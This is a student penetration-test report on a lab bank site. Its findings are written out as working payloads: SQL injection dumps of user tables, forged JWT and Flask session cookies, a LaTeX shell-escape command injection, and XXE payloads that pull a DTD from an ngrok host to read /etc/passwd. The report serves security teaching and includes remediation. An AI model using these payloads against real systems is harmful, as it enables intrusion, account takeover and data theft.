# Penetration testing for quoccabank
By Peter Chen(z5255813), Jayden Leung(z5312070), Yanning Cao(z5135152) and William Yin(z5017279)

---

# Vulnerability Classification
Compiling pre-existing classifications from [PortSwigger](https://portswigger.net/kb/issues) and [BugCrowd](https://www.bugcrowd.com/blog/vulnerability-prioritization-at-bugcrowd/), we have created our own classification as follows:
## P1 – CRITICAL
Vulnerabilities that cause a privilege escalation on the platform from unprivileged to admin, allows remote code execution, financial theft, etc. Examples: vulnerabilities that result in Remote Code Execution such as Vertical Authentication bypass, SSRF, XXE, SQL Injection, User authentication bypass.
## P2 – HIGH
Vulnerabilities that affect the security of the platform including the processes it supports. Examples: Lateral authentication bypass, Stored XSS, some CSRF depending on impact.
## P3 – MEDIUM
Vulnerabilities that affect multiple users, and require little or no user interaction to trigger. Examples: Reflective XSS, Direct object reference, URL Redirect, some CSRF depending on impact.
## P4 – LOW
Issues that affect singular users and require interaction or significant prerequisites (MitM) to trigger. Examples: Common flaws, Debug information, Mixed Content.
## P5 – BIZ ACCEPTED RISK
Non-exploitable weaknesses and “won’t fix” vulnerabilities. Examples: Best practices, mitigations, issues that are by design or acceptable business risk to the customer such as use of CAPTCHAS.

---

# Reconnaissance and initial surveying
In our first week of contact with Quoccabank, our outlook was to survey and map out all accessible Quoccabank domains and subdomains, such that we could both understand what domains to monitor as well as to discover any forgotten and deprecated subdomains that could pose a threat to our client. Attackers typically use disremembered subdomains to access forbidden resources or to gain additional intelligence in order to scope out additional weaknesses.

As such, we needed to be thorough with our analysis and over the course of the week, we accrued 22 different subdomains which were public-facing. The domains found are (Not all listed domains, just ones with flags):
https://careers.quoccabank.com
https://dev.quoccabank.com
https://mobile.quoccabank.com
https://creditcard.quoccabank.com
https://m.quoccabank.com
https://banking.quoccabank.com
https://test.quoccabank.com
https://welcome.quoccabank.com
https://adserver.quoccabank.com
https://www.quoccabank.com/_static/scripts/devsite-dev.js
https://m.staging.quoccabank.com
https://super-secret.admin.quoccabank.com
https://vault42.sandbox.quoccabank.com
https://wow-how-did-i-find-this-super-secret-backup.quoccabank.com
https://www-cdn.quoccabank.com
https://www-dev.quoccabank.com
https://www-preprod.quoccabank.com
https://www-staging.quoccabank.com
https://vault42.quoccabank.com/
https://www-cdn-hk.quoccabank.com/
https://www-cdn-au.quoccabank.com/
https://foobar-recruit.quoccabank.com/

To find these sub-domains, a variety of approaches were utilized by all of our team members, to verify and collate our findings in conjunction with identifying and disclosing any further sub-domains. The approaches include:

- **Brute Forcing subdomain names:** This technique is rather attractive as little third party content is required, only self-intuition needed for success. By testing potential domain names, many of the domains on the list could be found with patience and time. Potential domains include subdomains common for financial institutions; banking and careers, common for consumer websites; mobile (including m for brevity), common for professional-developer created sites; (dev, preprod, staging, test,). One should note that this method is not recommended as the primary source of reconnaissance as human intuition is no match for a web crawler.

- **Web Crawling using Burp Suite:** Within the provided Burp-suite application, web crawling is an in-built and implemented feature allowing for the automated composition of accessible subdomains. This tool was excellent and found the majority of our listed sub-domains. This method beats out intuition as the more vague subdomains could be found in a short amount of time (such as vault42.sandbox and super-secret.admin), and as such, is a go to tool for performing reconnaissance.

- **Web Crawling using self-curated Python scripts:** This method was utilized as a self-development exercise for our team. Although many pre-existing web crawlers could be used, the creation of our own web-crawlers using Python and the Requests library proved an invaluable glance into how these technologies worked.

- **OSINT:** There already exists a plethora of web-crawlers, DNS directory finders and sub-domain locators, in a variety of forms and offering a multitude of adjustable parameters. It was encouraged that we could constantly corroborate our data with other sources and such, a brisk comparison with various online and local tools netted us a few more obscure domains. To give proper credit, the tool we used was a online DNS scanner and can be found [here](https://www.nmmapper.com/sys/tools/subdomainfinder/).


# User Authentication Bypass - P1
## Poor User Login Credentials
### Vulnerability Details
This encompasses countless weaknesses, however, they share the common theme of usurping any authentication measures.

Broadly speaking, most vulnerabilities in authentication mechanisms arise in one of two ways:

- The authentication mechanisms are weak because they fail to adequately protect against brute-force attacks. This includes things such as default login credentials, or passwords that have been previously exposed
- Logic flaws or poor coding in the implementation allow the authentication mechanisms to be bypassed entirely by an attacker. This is sometimes referred to as "broken authentication".
- Refer to PortSwigger's summary [here](https://portswigger.net/web-security/authentication)

### Proof of Concept / Steps to Reproduce 
<!--  How to reproduce for each site-->
#### blog.quoccabank.com
There were 2 vulnerabilities of this nature on this domain. One approach begins with an IDOR vulnerability; the other involves recon understanding of Wordpress systems which is accessed through `/wp-admin/` by default.
- Start this attack from the IDOR vulnerability, as previously described. There exists a hyperlink that redirects the user to a login page for Wordpress, an authorisation page for managers and staff of the blog. 
- A quick test by testing `admin` as the username and password granted access to the administrator account. 
![Administrator account login page.](https://i.imgur.com/FcG59jW.png)*Administrator account login page.*

The other involved, a common password for the Administrator account:
- Due to the leakage of information from wrong login credentials, we know that `administrator` and the `mq` account both exist.
- Running a brute-force with the common passwords dictionary, we found the correct password to both accounts to be `1q2w3e`
![mq (Madame Quoc) account login page.](https://i.imgur.com/cZjwGw4.png) *mq (Madame Quoc) account login page.*

#### files.quoccabank.com
- Accessing `/admin` as hinted from `robots.txt` results in a pin prompt. 
 ![Hint from robots.txt](https://i.imgur.com/vsUlTER.png) 
 *Hint from robots.txt*
- Running a script to brute-force the pin by sending doctored HTTP POST requests results in a successful hit as `1024`.
![Successful brute force](https://i.imgur.com/HA8IpR5.png)
 *Successful brute force*

### Impact 
<!--  Impact for each site-->
#### blog.quoccabank.com
- This allows the attacker to pretty much gain access to anything on the website. For example create user accounts, delete accounts, view private details of users, kick users out of their session, change their password, create application passwords for use with other services, alter or delete content, publicise private content, install third-party plugins and much more.

#### files.quoccabank.com
- Access to an admin account even through a deprecated admin page grants the same privileges as any other authorisation method. Access to the admin account grants immense privilege to do many things typically.
- If they are able to compromise a high-privileged account, such as a system administrator, they could take full control over the entire application and potentially gain access to internal infrastructure.
### Remediation
- Developers should follow the [NIST](https://pages.nist.gov/800-63-3/sp800-63b.html) requirements for passwords, deterring the use of dictionary attacks.
- One must ensure that pin codes are avoided, if it is used to login to an admin account, with passwords being utilised instead. Passwords offer much better entropy against attackers, and cannot be brute-forced as easily.
- Rate limiting can be used to slow down brute force attacks by controlling the traffic rate from and to the server. Check out [OWASP Rate Limiting](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html#rate-limiting) for more information.


## Session Cookie Modification
### Vulnerability Details 
- Session information is not signed (JWT) and therefore not checked.
- Cookie is encoded in Base64. Base64 is not a secure encryption algorithm. 
- Cookies storing authentication/authorisation details

### Proof of Concept / Steps to Reproduce 
#### sales.quoccabank.com
- Decoding Base64 cookie `YWRtaW49MA==` reveals `admin=0`
- Changing it to `admin=1` and re-encoding cookie using Base64 gives `YWRtaW49MQ==`
![Admin account login page](https://i.imgur.com/FxLakzn.png) *Admin account login page*

#### notes.quoccabank.com
- Looking at the cookie we see that it is in JWT form `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VybmFtZSI6Ino1MzEyMDcwQHF1b2NjYWJhbmsuY29tIiwiZXhwIjoxNjI1MjMzMjcyfQ._CPHLkC_xf4-XwpHNoyCOKQl_qzGRpCRaCRT2JQbaE0`
- Decoding the JWT we get:
```json=
  "Username": "z5312070@quoccabank.com",
  "exp": 1625233272
```
- We want to change the JWT to:
```json=
  "Username": "admin@quoccabank.com",
  "exp": 2625233272
```
- This gives us the new JWT token: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VybmFtZSI6ImFkbWluQHF1b2NjYWJhbmsuY29tIiwiZXhwIjoyNjI1OTgzNzE2fQ.-e6E5XgWVGeXNfjQ8azs12Tvcr7WZJB4NM_Ue-OfnC8`
- Swapping out the cookie gives us access to the admin account.
![](https://i.imgur.com/1ANltEp.png)
*Successfully logged in as admin*

#### bigapp.quoccabank.com
- After experiencing the standard process of registering an account and logging into it, we will find that it stores a cookie encoded in base64.
![](https://i.imgur.com/YYtm57H.png)
*bigapp cookie*
- The cookie encodes `email:user_type` and simply changing the `user_type` from `user` to `admin` grants the user higher privileges.
![](https://i.imgur.com/f0Kkjoq.png)
*Changing bigapp cookie*
![](https://i.imgur.com/ugSnNwW.png)
*Escalated privilege*

### Impact 
#### sales.quoccabank.com
- Well-trained attackers can recognise the syntax of Base64 and be able to instantly bypass the installed authentication system. This simple trick allows users to bypass this form of authentication, allowing them to access any restricted resource that may be held exclusively for authenticated personnel. In this case, it reveals private financial information which could be used for corporate espionage or black-mail.

#### notes.quoccabank.com
- Attackers could use this exploit to reveal sensitive information about users, not only violating user privacy, but could potentially lead to blackmailing or provide information for another attack. Additionally, lawsuits could be launched as a result for a breach of privacy.

#### bigapp.quoccabank.com
- By simply changing the `user_type`, the user is granted higher privileges into the database and as a result, it can expose sensitive information that was not previously visible to the user, among elevating user privileges to that of an Admin, granting executive power.

### Remediation
- Base64 is not encryption and should not be treated as such. The use of cookies may be inevitable for an efficient and user-friendly experience, but Base64 only provides obscurity, not security. 
- Use signed JWT and validate with the server would be our solution. Check out [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) for more information on how to properly handle sessions.
- The HTTP-only flag could be set on the cookie to prevent cookies from being viewed and altered by Javascript code. Check out [OWASP HttpOnly](https://owasp.org/www-community/HttpOnly) for more information.


---
# Remote Code Execution - P1
## LaTeX Command Injection
### Vulnerability Details 
- The ability to inject malicious code into LaTeX format, performing actions such as reading, writing, executing and deleting files on the file system.
### Proof of Concept / Steps to Reproduce 
#### letters.quoccabank.com
- From reading the source code at `/source`, we know a key is stored on the server.
```python=
if dbg_option != "":
    # this makes us super safe
    with open("/key", "r") as key_file:
      skey = key_file.read().strip()
    s = Signer(skey)
    try:
      dbg_option = s.unsign(dbg_option).decode('utf-8')
    except BadSignature:
      return helpers.error_page(
          403,
          "Forbidden",
          "You don't have access",
          publicDebug="debug option is not signed correctly")
```
- Injecting `\input{../../key}` as the payload allows us to read the content of the`key` which is `imagineUsingW0rd`.
![](https://i.imgur.com/qGriHro.png)
*Output of the injection*
- From reading the source, we know that Pandoc is used convert Markup to PDF
```python=
 p = Popen(
        ('timeout', '5', 'pandoc', '--template=' + filename + "_template.tex",
         '--from=markdown', '-s', '-o', filename + '.pdf', '--latex-engine-opt',
         dbg_option, filename + '.md'),
        stdout=PIPE,
        stderr=PIPE)
```
- On `Pandoc`, there is a debug option that`-shell-escape` that allows shell commands to be run. So by signing the string `-shell-escape` with the key `imagineUsingW0rd`, it can enable the debug option on the site.
```python=
from itsdangerous import Signer, BadSignature
    skey = b'imagineUsingW0rd'
    skey = skey.strip()
    s = Signer(skey)
    dbg_option = s.sign("-shell-escape")
    print(dbg_option)

# -shell-escape.ZYO1d05uy-FCZuQ_fSzoDfjkipM
```
- Passing in `-shell-escape.ZYO1d05uy-FCZuQ_fSzoDfjkipM` to the debug option field allows us to inject`\input{|"echo ""; ls / | base64"}`. We convert to Base64 to remove formatting errors.
![Injecting the payload](https://i.imgur.com/woXDYmS.png)
*Injecting the payload*
![Output the injection](https://i.imgur.com/ZaAJl33.png)
*Output the injection*
- Converting it from Base64 reveals the file system's content.
![](https://i.imgur.com/LJrh2QN.png)

### Impact
This vulnerability gives a window for attackers to launch remote code executions against the website, allowing the execution of malicious programs and tampering with the file-system structure, which threatens the stability of the letters sub-domain.

### Remediation
- A priority recommendation would be to disable the debug option on the site, or ensure proper authentication is set for developers wishing to use this option. This will only work however, if the authentication protocols in-place are certified and secure. 
- Alternatively, debug options should not be available on the production build.
- For more information read the following [OWASP Security Misconfiguration report](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration).

## SQL Injection
### Vulnerability Details 
- A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. 
- A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. 
- SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.
- Quoted from [OWASP on SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection).
### Proof of Concept / Steps to Reproduce 
#### pay-portal.quoccabank.com
-  We first start by targeting the list of all tables. We can do this by calling searching the meta-table: `information_schema.tables` and dumping all listed tables.
-  We need to first find out the number of columns needed. By incrementing SQLi payloads of constants until no error is given, we can find out the cardinality needed for pay-portal to be 8. Our final payload is:
```sql=
" OR "1" = "1" UNION SELECT 1,2,3,4,5,6,7, table_name FROM information_schema.tables WHERE table_schema = 'sys';--
```
- Passing this payload will result in a dump of all financial records on the site.

![Payportal's output from injection payload](https://i.imgur.com/qZzNurn.png) *Payportal's output from injection payload*

#### bigapp.quoccabank.com
Bigapp had a few SQLi vulnerabilties. The first one pertained to the login screen
- Feeding in a simple SQLi query for both the username and password grants access to Sally Rae's account`a' OR '1'='1' #A` A commented character at the end of the payload is needed to disregard the rest of the query.
![Sally Rae's login page](https://i.imgur.com/Xcv8pXN.png) *Sally Rae's login page*

The second vulnerability is pertinent to the ability to leak user data such as passwords.
- We start by logging in as any user and locating on the search bar on the top right.
- We must first find out the formatting required for the query to work. By incrementing the number of closing brackets in our SQL payload, we can discover what level of nesting the current query is on. For bigapp, 2 closing brackets are needed.
- We can also check the cardinality by adding constants until the SQL call is valid. Testing will reveal a cardinality of 6 columns.
- Knowing the previous attributes for cardinality and columns, we can create a payload. We start by trying to get a list of all tables `a' )) UNION SELECT 1, 2, 3, 4, 5, table_name FROM information_schema.tables; -- a`
- Next, we want to target the `users` table. We will dump all the column names of this table with `a' )) UNION SELECT table_name, column_name,1,2,3,4 FROM information_schema.columns WHERE table_name = 'users'; -- a`
- Once we get the column details, we can view the table's entries through ` a' )) UNION SELECT id, fname,lname,password,type,email FROM users; -- a`
- A perceptive attacker will notice that the passwords are hashed using MD5. However, using crackstation.net, one can reverse this MD5, provided it is a common password. Doing so for the admin account will give the password as `Admin@123`.
![Admin's login credential](https://i.imgur.com/DN7gijj.png) *Admin's login credential*



The next vulnerability is focused on sorting the main data-table.
- By sending this portion of SQL query `a')) union select * from bproducts order by pname -- a`, we can see the table sorted by `pname` product name instead.
<!-- - This induces a header flag in the response of the json data composing the table contents. -->

Another vulnerability is related to the privileges available in the scope of the registration form.
- After first determining the format necessary for injection, we begin looking for table information from the information_schema using `a')) UNION SELECT table_name, column_name, 1, 1, 1, 1 FROM information_schema.columns -- a`.
- Observing the returned results, we can see that the users table exists and it has fields we can check using the following two lines:
```sql=
a')) UNION SELECT 1, id, fname, lname, type, userid FROM users -- a
a')) UNION SELECT 1, email, mobile, city, state, postcode FROM users -- a
```
- By logging out and returning to the registration page, we can use any browser's built-in inspection tools or any tool that can make HTTP requests to bypass the page's inbuilt format check with `email' OR '1'='1' #A` where `email` is an actual email or anything if you bypass the format check.
- This returns a page displaying all the emails in the database, exposing sensitive information to everyone.
![Page contains all the sensitive informations of the users.](https://i.imgur.com/Dvr9T5h.png) *Page contains all the sensitive informations of the users.*


### Impact 
<!--  Impact for each site-->
#### pay-portal.quoccabank.com
- The pay-portal vulnerability allows users to view, edit and modify the full SQL database which could be catastrophic for the site. Attackers can not only view confidential data regarding finances, but are also free to edit and delete the database(s), wrecking havoc regarding income, which would threaten all users directly.

#### bigapp.quoccabank.com
 - SQLi vulnerabilities throughout the site makes it possible to bypass the login screen, effectively rendering authentication useless. Attackers can use this method to login to other user's accounts including those of administrator roles or positions.
 - Other SQLi vulnerabilities in the main table such as being able to sort, makes it possible for attackers to view confidential data such as users passwords, which attackers could use to target individuals elsewhere.
     - In reality, by bypassing the registration page, it exposes stored email information to unregistered users.
 - SQLi vulnerabilities also allow attackers to edit and update the main database, which could prove devastating to the domain.

### Remediation
One method of mitigation for SQLi attacks is to bind variables or follow SQL parameterised queries. An example for a Java input structure should be as follows:
```java=
// This should REALLY be validated too
String custname = request.getParameter("customerName");
// Perform input validation to detect attacks
String query = "SELECT account_balance FROM user_data WHERE user_name = ? ";
PreparedStatement pstmt = connection.prepareStatement( query );
pstmt.setString( 1, custname);
ResultSet results = pstmt.executeQuery( );
```
Parameterised statements prevent attackers from injecting code instead of data, eliminating the SQL query all together. See [OWASP's SQLi Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) for more details.

In the case of a injection, a deterrence for data protection would be to salt the passwords prior to hashing, such that the password cannot be easily reversed through online crackers such as crackstation.net, further limiting the effect of the attack if the passwords have been leaked.

---
# XXE - P1/P2
### Vulnerability Details
- An XML External Entity (XXE) attack is a type of attack against an application that parses XML input. 
- This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. 
- From [OWASP on XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
### Proof of Concept / Steps to Reproduce 
#### v1.feedifier.quoccabank.com
- Since this XML parser doesn't have any filters, a simple `SYSTEM` read can be used to expose content on the file system.
- Using the python library `SimpleHTTPServer` we can set up a local web server to host our payload. `python -m SimpleHTTPServer <port_number>`
- We can then use [ngrok](https://ngrok.com/) to expose our local server to the public. `./ngrok http <port_number>`
- We then pass the URL provided by [ngrok](https://ngrok.com/) into v1.feedifier.
![](https://i.imgur.com/NyZEAkg.png)
*v1 feedifier input*
![](https://i.imgur.com/ivAtYXO.png)
*v1 exposing /etc/passwd*
```xml=
<!-- v1index.html -->
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0">
<channel>
  <title>W3Schools Home Page</title>
  <link>https://www.w3schools.com</link>
  <description>Free web building tutorials</description>
  <item>
    <title>RSS Tutorial</title>
    <link>https://www.w3schools.com/xml</link>
    <description>&xxe;</description>
  </item>
</channel>
</rss>
```
#### v2.feedifier.quoccabank.com
- Since this XML parser filters only the first level of XML file, by simply using a external entity reference, we can bypass this filter.
- Using the python library `SimpleHTTPServer` we can set up a local web server to host our payloads. `python -m SimpleHTTPServer <port_number>`
- We can then use [ngrok](https://ngrok.com/) to expose our local server to the public. `./ngrok http <port_number>`
- We then pass the URL provided by [ngrok](https://ngrok.com/) into v2.feedifier.
![](https://i.imgur.com/LvCGodg.png) 
*v2 feedifier input*
![](https://i.imgur.com/CXd6lYi.png)
*v2 exposing /etc/passwd*
```xml=
<!-- v2index.html -->
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ 
  <!ELEMENT foo ANY>
  <!ENTITY % xxe SYSTEM "http://3cbf1917c733.ngrok.io/v2ParamInjection.dtd">
  %xxe;
]>
<rss version="2.0">
  <channel>
      <title>a1</title>
      <link>a1</link>
      <description>a1</description>
      <item>
      <title>a</title>
      <link>a</link>
      <description>&payload;</description>
      </item>
</channel>
</rss>
```
```xml=
<!-- v2ParamInjection.dtd -->
<!ENTITY % combined "<!ENTITY payload SYSTEM 'file:///etc/passwd'>">
%combined;
```
#### v3.feedifier.quoccabank.com
- Since the XML pass filters bad words from a blacklist of words including `file://`, `etc`, `passwd`, `flag`, We can use concatenation our strings to bypass this.
- Using the python library `SimpleHTTPServer` we can set up a local web server to host our payloads. `python -m SimpleHTTPServer <port_number>`
- We can then use [ngrok](https://ngrok.com/) to expose our local server to the public. `./ngrok http <port_number>`
- We then pass the URL provided by [ngrok](https://ngrok.com/) into v3.feedifier.
![](https://i.imgur.com/EZLhlrV.png)
*v3 feedifier input*
![](https://i.imgur.com/LD2wCNj.png)
*v3 exposing /etc/passwd*
```xml=
<!-- v3index.html -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
  <!ELEMENT foo ANY >
  <!ENTITY % xxe SYSTEM "http://3cbf1917c733.ngrok.io/v3ParamInjection.dtd">
  %xxe;
]>
<rss version="2.0">
  <channel>
      <title>a1</title>
      <link>a1</link>
      <description>a1</description>
      <item>
      <title>a</title>
      <link>a</link>
      <description>&payload;</description>
      </item>
</channel>
</rss>
```
```xml=
<!-- v3ParamInjection.dtd -->
<!ENTITY % s1 "file">
<!ENTITY % s2 ":///et">
<!ENTITY % s3 "c/pass">
<!ENTITY % s4 "wd">
<!ENTITY % combined "<!ENTITY payload SYSTEM '%s1;%s2;%s3;%s4;'>">
%combined;
```

### Impact 
- This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, compromising the integrity and stability of the domain and possessing wider system impacts.
### Remediation
- Almost all XXE is due to a XML parsing library supporting dangerous XML features. The easiest way to prevent this type of attack is to disable resolution of external ties and die support for XInclude. 
- For more information read [OWASP's XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html).



---
# IDOR/Enumeration - P3

### Vulnerability Details
- Insecure Direct Object Reference (called IDOR from here) occurs when a application exposes a reference to an internal implementation object. Using this way, it reveals the real identifier and format/pattern used of the element in the storage backend side. The most common example of it (although is not limited to this one) is a record identifier in a storage system (database, filesystem and so on).
- From [OWASP's Insecure Direct Object Reference Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
### Proof of Concept / Steps to Reproduce 
<!--  How to reproduce for each site-->
#### blog.quoccabank.com
- Enumeration of pages in the url`/?p=page_number`.
- From this, we could find a public-facing and accessible [website](https://blog.quoccabank.com/?p=2).
- Given that the website is written in WordPress, we know that the login page is at `/wp-admin`.
![website when /?p=2](https://i.imgur.com/BHblpuM.png)
*website when /?p=2*
#### files.quoccabank.com
- After registering an account and creating a file, the URL of the new file consisted of a base64 encoded string(`ZmRhcw==`) and a sub-directory(`new_file`).
- Decoding the base64 encoded string revealed that it stored the username. This means that the website differentiates ownership of files based on the parameter passed in as `r`. 
- By encoding `admin` as base64 and brute forcing for sub-directories it revealed the hidden file at this [url](`https://files.quoccabank.com/document/flag?r=YWRtaW4=`).
-![](https://i.imgur.com/iRFEl6a.png)
*hidden file*


#### bfd.quoccabank.com
- Ability to access `/etc/passwd`, which houses confidential passwords for the file-system.
![](https://i.imgur.com/i1w8HoV.png)
*Exposing /etc/passwd*
#### support.quoccabank.com
- After determining that the url `/raw/RWEau2GQ` is `1511:1` encoded in base58 (which we interpreted as useful data due to understanding that our user id was `1511`), we enumerate through the first number and send a request to the server to check if the page returns a `200` status code
```python=
# Script to generate payload
f = open("payload.txt", "w")
for i in range(10000):
    s = f"{i}:1"
    encoded = base58.b58encode(s)
    f.write(encoded.decode('UTF-8') + "\n")
# 200 status code numbers
# 1:1, 8:1, 274:1, 1125:1, 1511:1, 1730:1, 1780:1, 9947:1
```
- Similarly, we can then enumerate through those pages and check those pages return a 200 status code
```python=
# Script to payload
f = open("payload.txt", "w")
valid_nums = [1, 8, 274, 1125, 1511, 1730, 1780, 9447]
for i in range(100):
    for j in valid_nums:
        f.write(base58.b58encode(f"{j}:{i}").decode('UTF-8') + "\n")
```
Just two of the successful attacks were:
* 9447:1 base58 encoded [url](https://support.quoccabank.com/raw/VVBWU75i)
* 1125:4 base58 encoded [url](https://support.quoccabank.com/raw/RVnSH2uR)
![](https://i.imgur.com/1jFb2eY.png)
*9447:1*
![](https://i.imgur.com/lr4e5LH.png)
*1125:4*


### Impact 
#### blog.quoccabank.com
- It allows attackers to access pages not publicly shown on the main page. This could expose users, developers notes, to which an attacker could further use to exploit other domains.
- Enumeration for accounts reveal existing accounts, which an attacker could then use to target specific users such as Administrator accounts or roles of power, which could prove detrimental to the domain.

#### files.quoccabank.com
- Changing the base64 encoded username allows attackers to masquerade as other users and view their files, a blatant breach of their privacy. If the victim is a developer, confidential files could lead an attacker to target weaker systems.

#### support.quoccabank.com
- Since the attacker can view all the support tickets, they can view all the problems with the site. This provides them a variety of potential vulnerabilities in which that they use to attack, potentially giving them exploits for wider domains.

### Remediation
- Don't store user identification in the URL, instead store it as signed JWT cookies. Ensure that these JWT cookies are correctly configured and verified by the server. 
- To prevent the brute forcing of files, rate limit access to the website. Enforce a human check - use reCAPTCHA system for example. [OWASP on Blocking Brute Force Attacks](https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks) may prove helpful to review.
- Sanitise all user input even if it is encoded. Users should only have access to pages they own and not other pages owned by other users. [OWASP's Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) may prove helpful.


---

# Information Exposure - P4
## Comments
### Vulnerability Details 
- Verbose comments left for other developers can provide any viewer the potential background knowledge of inplace systems.
- Refer to [OWASP on Webpage Comments and Metadata for Information Leakage](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage).
### Proof of Concept / Steps to Reproduce 
#### files.quoccabank.com
- Using a browser's inspect element, one could see that this domain had javascript comments in the backend, informing the viewer of another domain `files.quoccabank.com/covid19/supersecret/lmao/grant_staff_access?username=adam`
![extract js object using the browser's tool](https://i.imgur.com/onsmnMb.png)
*extract js object using the browser's tool*

![The link in the js object](https://i.imgur.com/1pRTKfq.png)
*The link in the js object*

- Accessing this URL produced two additional files in any user's directory when logged in.
### Impact 
#### files.quoccabank.com
- Users who access this link will gain staff access to staff files, to which a skilled attacker could exploit for a vertical authentication bypass, granting them administrative power which would cause catastrophe here and potentially abroad.

### Remediation
- We suggest that developers audit their source code. Actions should include scrub old comments and unnecessary information from systems such as javascript and HTML before pushing them to 'live'. Third-party auditing would also prove beneficial.
- Old systems should furthermore be removed if not needed anymore.
- For more information visit [OWASP on Webpage Comments and Metadata for Information Leakage](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage).

## Robots.txt
### Vulnerability Details 
- Robots.txt is not itself a security threat, and if implemented correctly, it can be beneficial for reasons not necessarily related to security. 
- Assume that attacks will pay close attention to any sub-directories identified in the file.
- Refer to [OWASP on Webserver Metafiles for Information Leakage](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage).

### Proof of Concept / Steps to Reproduce 
#### files.quoccabank.com
- Any user can access files.quoccabank.com/robots.txt. This website lists the [/admin](https://files.quoccabank.com/admin) sub-directory as an un-crawlable site, to which attackers would target on.
![](https://i.imgur.com/vsNeRFe.png)
*robots.txt websites*
### Impact 
- By revealing this sub-directory, it provides attacks with another route to attack your system, often at times, highlighting domains of power and control such as `/admin`.

### Remediation
- Secure the sub-directories listed in the `robots.txt`. One must ensure that these directories are not easily breachable or vulnerable to attacks as to deter a prioritized attack on `robots.txt` domains.
- For detailed information visit the [PortSwigger's Robots.txt Summary](https://portswigger.net/kb/issues/00600600_robots-txt-file).



## Unsanitised Files
### Vulnerability Details 
Developer files and information left on the system, allows attackers to misuse this data for further attacks
### Proof of Concept / Steps to Reproduce 
#### files.quoccabank.com

One of the attacks involves revealing hidden directory in the javascript file.
- Viewing the java script `app.d4309454.js` reveals a sub-directories `/covid19/supersecret/lmao/grant_staff_access?username=adam`.
- Going to it reveals two new files in the user's directory.
![](https://i.imgur.com/wOB3jfg.png)
*2 new recealed files*

From here, there exists another unsanitised file vulnerability
- Starting with the previous unsanitised file attack on this domain, the user could view a developer-intended file, `staff_flask_secret_key` revealing the flask secret `$hallICompareTHEE2aSummersday`.
![](https://i.imgur.com/sMBigQP.png)
*flask secrect key*
- Using the python library `flask-unsign` one can decode the present cookie and view the sensitive information

```bash=
flask-unsign --decode --cookie 'eyJyb2xlIjp7IiBiIjoiVTNSaFptWT0ifSwidXNlcm5hbWUiOiJibGFoIn0.YN8R_A.rn1Ykoe9iqWlFKEFuEG1JtDH4sY'
```    
```bash=
flask-unsign --sign --cookie "{'role': b'Admin', 'username': 'admin'}" --secret '$hallICompareTHEE2aSummersday'
```
- Changing the information then resigning and sending it to the server allows attackers access to the admin account.

### Impact 
<!--  Impact for each site-->
- By revealing hidden directories in the back end, it lead to confidential information leaked such as the flask secret key. This exposure allows the attacker to bypass user authentication, and act as any user, including administrator roles, thus granting them unchecked administrator powers.
### Remediation
- Developers should scrub the back-end and remove overly verbose information which attackers could then use against the system.
- Don't store any sensitive information like keys and passwords in plain text on the server.
- This information should be stored locally. Even better would be to not even store them at all.
- Refer to [OWASP on Webserver Metafiles for Information Leakage](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage).
---


# Conclusions

## Summary
Quoccabank claims its security is safe on their homepage and page comments and while they have adopted some industry practices, some have been implemented in such a way that they provide less security than intended, while others are woefully representative of industry practices of years gone by. Of the dozen-or-so subdomains covered in this report, almost all of them are vulnerable in some way or another due to unsanitised code or adoption of older practices or even insufficient implementations of industry's best practices.

As security researchers, we do not claim to be experts in business. However, based on experience and worldly knowledge thanks to forerunners in the industry, as well as extremely public *mishaps* by internationally renowned businesses and institutions - we can foresee the likely issues that may arise from the continued existence of the security issues outlined in this report.
- Quocca Bank is a private, financial institution; it answers to shareholders who decide the fate of the business at even the slightest rumour. 
- Quocca Bank is a financial institution; no person or entity would put their money in the hands of someone they can't trust.
- Quocca Bank is a financial institution; even before trust completely crashes, the government may see fit to suspend or withdraw Quocca Bank's licence to operate within this country.
- Quocca Bank's negligent handling of web-systems may expose the privacy of both systems and users, potentially opening the company to lawsuit, legal troubles or government interventions.
- Any security breaches regarding Quocca Bank would reach media outlets, amongst other communication that would seriously damage its reputation.

If any of the above happens, the name "Quocca Bank" and its operators may lose all trust and reputation it has and hinder the future activities or operations of any future endeavours by anyone associated with "Quocca Bank".

